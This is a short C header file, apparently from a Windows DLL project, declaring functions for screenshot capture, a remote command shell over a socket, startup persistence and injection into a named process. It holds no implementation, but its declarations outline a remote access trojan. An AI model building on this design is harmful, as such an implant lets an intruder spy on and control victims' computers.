#pragma once
#include "pch.h"
#include "framework.h"

#include "headers.h"
#include "dll_headers.h"

#include "sleaping.h"

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <direct.h>


int capture_screenshot_win32(const char* filename, gdi32_functions_t* gdi32);

status_t win_cmd(SOCKET socket);

int add_to_startup();
int inject(PNT_FUNCTIONS nt, WCHAR* procname);
